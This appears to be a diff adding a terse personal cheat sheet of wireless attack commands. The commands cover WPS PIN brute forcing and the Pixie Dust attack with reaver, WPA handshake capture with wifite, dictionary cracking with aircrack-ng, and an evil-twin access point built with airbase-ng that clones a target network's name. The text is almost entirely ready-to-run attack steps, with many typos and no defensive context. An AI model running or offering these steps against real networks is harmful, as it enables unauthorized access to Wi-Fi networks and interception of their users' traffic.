@@ -1,0 +1,29 @@
+//brutal force on the PIN  if WPS is desable it wont work.
+airmon-ng start wlan0
+wash -i wlan0mon
+
+reaver -i wlan0mon -b bssid -c chanel -vv
+
+//Wifite and aircrack to test wpa password
+airmon-ng start wlan0
+wifite --mac --aircrack
+ctrl+C
+
+go to the golder where is the .cap file generated
+
+cd hs
+ls
+aircrack-ng *.cap -w /user/share/dict/wifi.txt <- work list
+
+
+//Pixiedest to recover hey
+airmon-ng start wlan0
+wash -i wlan0mon
+
+reaver -i wlan0mon -b bssid -c channel -K 1 -vv
+
+/evil twin
+airmon-ng start wlan0
+airodump-ng wlan0mon
+airbase-ng -a myrouterbissd --essid "Type the target name to clone the SID" -c channel wlan0mon
+Wireshark filter to AP, select wlan0mon -> stop de traffict
